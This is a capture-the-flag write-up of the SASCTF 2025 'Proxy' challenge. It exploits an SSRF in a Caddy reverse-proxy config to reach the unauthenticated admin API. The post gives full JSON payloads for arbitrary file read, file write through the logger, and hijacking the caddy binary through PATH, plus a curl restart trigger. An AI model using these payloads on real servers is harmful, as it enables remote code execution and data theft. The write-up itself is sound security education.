@@ -1,0 +1,541 @@
+---
+title: SASCTF 2025 Quals – Proxy
+date: '2025-05-31'
+draft: false
+authors: ['beluga']
+tags: ['Web', 'SASCTF 2025 Quals', 'SSRF', 'Caddy']
+summary: 'Exploited a misconfigured Caddy reverse proxy via SSRF.'
+---
+
+## Proxy (445 points, 15 solves)
+
+> Nowadays, some kind of connection transitivity is often required. We’re quite new to this market, would you mind to check our MVP?
+
+### Enviroment Setup
+
+We’re given the source code with following content:
+
+```
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         5/25/2025   5:51 AM            504 Caddyfile
+-a----         5/25/2025   5:00 AM            170 compose.yaml
+-a----         5/24/2025   6:29 PM            270 Dockerfile
+-a----         5/24/2025   6:30 PM             37 flag.sh
+-a----         5/24/2025   6:29 PM           1310 index.html
+-a----         5/24/2025   6:29 PM            103 start.sh
+```
+
+By observing the `Dockerfile`, we can see that it uses `caddy` image. Additionaly, several permission configuration are present; `index.html` is assigned with `666` permission, making it writable by everyone, while `flag.sh` was assigned with `0000` permission, restricting access from anybody.
+
+Looking at the CMD section, we can see that the application is run in an infinite loop, ensuring it automatically restarts after every stop.
+
+```dockerfile
+FROM caddy:2.10-alpine
+
+RUN apk add --no-cache \
+    python3-dev \
+    py3-pip 
+
+WORKDIR /app
+COPY index.html ./
+COPY Caddyfile ./
+
+RUN chmod 666 /app/index.html
+
+COPY flag.sh /
+RUN chmod 0000 /flag.sh
+
+CMD while true; do sh -c 'caddy run --config /app/Caddyfile'; done
+
+```
+
+> Root users are not affected by `0000` permissions due to the `CAP_DAC_OVERRIDE` capability, which allows bypassing standard file permission checks
+
+In the `compose.yml`, `CAP_DAC_OVERRIDE` capabilities were dropped. 
+
+```yaml
+services:
+  caddy:
+    build: .
+    image: cr.yandex/crptrom4kvc0o44vpcg6/caddy
+    ports:
+      - 8080:80
+      - 2019:2019
+    cap_drop:
+            - CAP_DAC_OVERRIDE
+
+```
+
+Additionaly, the same capabilities setup also happened within `start.sh` files. 
+
+```bash
+sudo docker run \
+    -p 8080:80 \
+    --cap-drop CAP_DAC_OVERRIDE \
+    --name wb \
+    -t web-caddy
+
+```
+
+This mean that even with root privileges inside the container, we can’t access the files with `0000` permission, such as `flag.sh`.
+
+### Source Code Analysis
+
+This challenge utilize [Caddy](https://caddyserver.com/) which is web server written in GoLang. It uses `Caddyfile` files as its config.
+
+```go
+:80 {
+	@stripHostPort path_regexp stripHostPort ^\/([^\/]+?)(?::(\d+))?(\/.*)?$
+
+	map {http.regexp.stripHostPort.2} {targetPort} {
+		"" 80
+		default {http.regexp.stripHostPort.2}
+	}
+
+	map {http.regexp.stripHostPort.3} {targetPath} {
+		"" /
+		default {http.regexp.stripHostPort.3}
+	}
+
+	handle @stripHostPort {
+		rewrite {targetPath}
+
+		reverse_proxy {http.regexp.stripHostPort.1}:{targetPort} {
+			header_up Host {http.regexp.stripHostPort.1}:{targetPort}
+		}
+	}
+
+	handle {
+		root * ./
+		file_server
+	}
+}
+```
+
+The file defines regex rules to extract hostname, port, and path from URLs in the format `/hostname:port/path`. These extracted values are then used by the reverse proxy to forward requests dynamically. Since the target host and port are user-controlled, this behavior introduces a Server-Side Request Forgery (SSRF) vulnerability.
+
+It was found that Caddy have an [Administrator API](https://caddyserver.com/docs/api) on port 2019. This API is not protected with authentication and accepts any connection. Normally, this port can’t be reached by anyone outside the local network, however since we are able to find an SSRF, we can construct URLs like `/localhost:2019/PATH` to access it.
+
+> If you are running untrusted code on your server (yikes 😬), make sure you protect your admin endpoint by isolating processes, patching vulnerable programs, and configuring the endpoint to bind to a permissioned unix socket instead.
+
+Looking at the API documentation, we can override active configuration by sending a POST requests into `/load` endpoint. By running the docker instances, we can obtain current config within `/config/caddy/autosave.json` with following content:
+
+```json
+{
+  "apps": {
+    "http": {
+      "servers": {
+        "srv0": {
+          "listen": [
+            ":80"
+          ],
+          "routes": [
+            {
+              "handle": [
+                {
+                  "defaults": [
+                    "{http.regexp.stripHostPort.2}"
+                  ],
+                  "destinations": [
+                    "{targetPort}"
+                  ],
+                  "handler": "map",
+                  "mappings": [
+                    {
+                      "outputs": [
+                        80
+                      ]
+                    }
+                  ],
+                  "source": "{http.regexp.stripHostPort.2}"
+                },
+                {
+                  "defaults": [
+                    "{http.regexp.stripHostPort.3}"
+                  ],
+                  "destinations": [
+                    "{targetPath}"
+                  ],
+                  "handler": "map",
+                  "mappings": [
+                    {
+                      "outputs": [
+                        "/"
+                      ]
+                    }
+                  ],
+                  "source": "{http.regexp.stripHostPort.3}"
+                }
+              ]
+            },
+            {
+              "group": "group2",
+              "handle": [
+                {
+                  "handler": "subroute",
+                  "routes": [
+                    {
+                      "group": "group0",
+                      "handle": [
+                        {
+                          "handler": "rewrite",
+                          "uri": "{targetPath}"
+                        }
+                      ]
+                    },
+                    {
+                      "handle": [
+                        {
+                          "handler": "reverse_proxy",
+                          "headers": {
+                            "request": {
+                              "set": {
+                                "Host": [
+                                  "{http.regexp.stripHostPort.1}:{targetPort}"
+                                ]
+                              }
+                            }
+                          },
+                          "upstreams": [
+                            {
+                              "dial": "{http.regexp.stripHostPort.1}:{targetPort}"
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ],
+              "match": [
+                {
+                  "path_regexp": {
+                    "name": "stripHostPort",
+                    "pattern": "^\\/([^\\/]+?)(?::(\\d+))?(\\/.*)?$"
+                  }
+                }
+              ]
+            },
+            {
+              "group": "group2",
+              "handle": [
+                {
+                  "handler": "subroute",
+                  "routes": [
+                    {
+                      "handle": [
+                        {
+                          "handler": "vars",
+                          "root": "./"
+                        },
+                        {
+                          "handler": "file_server",
+                          "hide": [
+                            "/app/Caddyfile"
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      }
+    }
+  }
+}
+```
+
+If we send a post request, then the config will change accordingly and server will restart itself to reload the latest config.
+
+![Config Reload](/static/images/sasctf-2025-quals/proxy/reload.png)
+
+From the documentation and experimentation, we found that we can:
+
+1. Read Arbitrary Files
+2. Write Arbitrary Files
+
+### Arbitrary File Read
+
+The following payload sets the server root to `/`, allowing access to arbitrary files:
+
+```json
+{
+  "apps": {
+    "http": {
+      "servers": {
+        "srv0": {
+          "listen": [":80"],
+          "routes": [
+            {
+              "handle": [
+                {
+                  "handler": "subroute",
+                  "routes": [
+                    {
+                      "handle": [
+                        {
+                          "handler": "vars",
+                          "root": "/",
+                        },
+                        {
+                          "handler": "file_server"
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      }
+    }
+  }
+}
+```
+
+This allows accessing files such as `/etc/passwd` via `http://localhost:8080/etc/passwd`.
+
+### Arbitrary File Write
+
+Caddy support logging into a custom file. By configuring the logger, we can write arbitrary content to arbitrary paths as `root`, and even set permissions.
+
+```json
+
+  "logging": {
+    "logs": {
+      "default": {
+        "writer": {
+          "output": "file",
+          "filename": "/tmp/PWNED",
+          "mode": "0777"
+        },
+        "encoder": {
+          "time_format": "arbitrary values"
+          "format": "console"
+        }
+      }
+    }
+  }
+```
+
+This should be combined with the original caddy config in order to avoid caddy crashes. The structure would be like this
+
+```
+logger,
+original caddy config
+```
+
+When the config is updated, a new file is created as follows.
+
+![New file created](/static/images/sasctf-2025-quals/proxy/new-file.png)
+
+### Finding a solution
+
+At this point, we had both arbitrary file read and write—but we still couldn’t read `flag.sh` due to its `0000` permissions and dropped capabilities.
+
+Our team explored several failed approaches:
+
+- Changing `flag.sh` permissions via file write: failed, as Caddy couldn’t open the file.
+- Overwriting the Caddy binary: not possible using the logger due to binary constraints.
+- Abusing cron/system services: no other services were running.
+
+### The Breakthrough
+
+We noticed that the container runs the `caddy` binary via a relative path. This matters because of how Linux resolves binaries using the `$PATH` environment variable:
+
+```
+/usr/local/sbin
+/usr/local/bin
+/usr/sbin
+/usr/bin
+```
+
+The original Caddy binary is at `/usr/bin/caddy`, but `/usr/local/sbin` has higher priority.
+
+Since we have root privileges and arbitrary file write, we can drop a malicious file at `/usr/local/sbin/caddy` and override the original binary.
+
+We used a logger configuration to write a reverse shell script or payload to `/usr/local/sbin/caddy`. This can be done with following logger config
+
+```json
+ "logging": {
+    "logs": {
+      "default": {
+        "writer": {
+          "output": "file",
+          "filename": "/tmp/PWNED",
+          "mode": "0777"
+        },
+        "encoder": {
+          "time_format": "#!/bin/sh\nchmod 777 /flag.sh; cp /flag.sh /app/index.html; /usr/bin/caddy run --config /app/Caddyfile\n",
+          "format": "console"
+        }
+      }
+    }
+  }
+```
+
+This config needs to be combined with original caddy config as well. In the end, the final payload would look like this:
+
+```json
+{
+    "logging":{
+        "logs":{
+            "default":{
+                "writer":{
+                    "output":"file",
+                    "filename":"/usr/local/sbin/caddy",
+                    "mode":"0777"
+                },
+                "encoder":{
+"time_format":"#!/bin/sh\nchmod 777 /flag.sh; cp /flag.sh /app/index.html; /usr/bin/caddy run --config /app/Caddyfile\n",
+                    "format":"console"
+                }
+            }
+        }
+    },
+  "apps": {
+    "http": {
+      "servers": {
+        "srv0": {
+          "listen": [":80"],
+          "routes": [
+            {
+              "handle": [
+                {
+                  "defaults": ["{http.regexp.stripHostPort.2}"],
+                  "destinations": ["{targetPort}"],
+                  "handler": "map",
+                  "mappings": [
+                    {
+                      "outputs": [80]
+                    }
+                  ],
+                  "source": "{http.regexp.stripHostPort.2}"
+                },
+                {
+                  "defaults": ["{http.regexp.stripHostPort.3}"],
+                  "destinations": ["{targetPath}"],
+                  "handler": "map",
+                  "mappings": [
+                    {
+                      "outputs": ["/"]
+                    }
+                  ],
+                  "source": "{http.regexp.stripHostPort.3}"
+                }
+              ]
+            },
+            {
+              "group": "group2",
+              "handle": [
+                {
+                  "handler": "subroute",
+                  "routes": [
+                    {
+                      "group": "group0",
+                      "handle": [
+                        {
+                          "handler": "rewrite",
+                          "uri": "{targetPath}"
+                        }
+                      ]
+                    },
+                    {
+                      "handle": [
+                        {
+                          "handler": "reverse_proxy",
+                          "headers": {
+                            "request": {
+                              "set": {
+                                "Host": ["{http.regexp.stripHostPort.1}:{targetPort}"]
+                              }
+                            }
+                          },
+                          "upstreams": [
+                            {
+                              "dial": "{http.regexp.stripHostPort.1}:{targetPort}"
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ],
+              "match": [
+                {
+                  "path_regexp": {
+                    "name": "stripHostPort",
+                    "pattern": "^\\/([^\\/]+?)(?::(\\d+))?(\\/.*)?$"
+                  }
+                }
+              ]
+            },
+            {
+              "group": "group2",
+              "handle": [
+                {
+                  "handler": "subroute",
+                  "routes": [
+                    {
+                      "handle": [
+                        {
+                          "handler": "vars",
+                          "root": "/app",
+                           "browse": 1
+                        },
+                        {
+                          "handler": "file_server",
+                          "hide": ["/app/Caddyfile"]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      }
+    }
+  }
+}
+```
+
+When this config is used, a new file is created within `/usr/local/sbin/caddy` with content of our command. The new caddy binary also pointed to `/usr/local/sbin/caddy` instead of `/usr/bin/caddy`.
+
+```
+/app # which caddy
+/usr/local/sbin/caddy
+/app # cat /usr/local/sbin/caddy 
+#!/bin/sh
+chmod 777 /flag.sh; cp /flag.sh /app/index.html; /usr/bin/caddy run --config /app/Caddyfile
+--- OTHER LOG CONTENT ---
+```
+
+### Triggering the Payload
+
+To make our malicious binary run, we need to restart the service. Since the startup script uses caddy (not `/usr/bin/caddy`), Linux will pick our binary in `/usr/local/sbin/caddy`.
+
+We can trigger a restart by sending a POST to the Admin API’s `/stop` endpoint as documented in their API Documentation:
+
+```sh
+curl -X POST http://localhost:8080/localhost:2019/stop
+```
+
+Interestingly, after sending the request, the terminal appeared to hang, and the Caddy service did not restart as expected. We discovered that manually interrupting the request using CTRL+C triggered the service to restart properly. 
+
+![Service Restart](/static/images/sasctf-2025-quals/proxy/restart.png)
+
+Once restarted, the system runs our malicious `/usr/local/sbin/caddy`, which executes our payload—such as dumping the flag into `index.html`.
+
+![Dumping the flag](/static/images/sasctf-2025-quals/proxy/dump-flag.png)
+
+The same exploit needs to be performed for remote instances. Then flag should be retrieved.
+
+![Flag](/static/images/sasctf-2025-quals/proxy/flag.png)
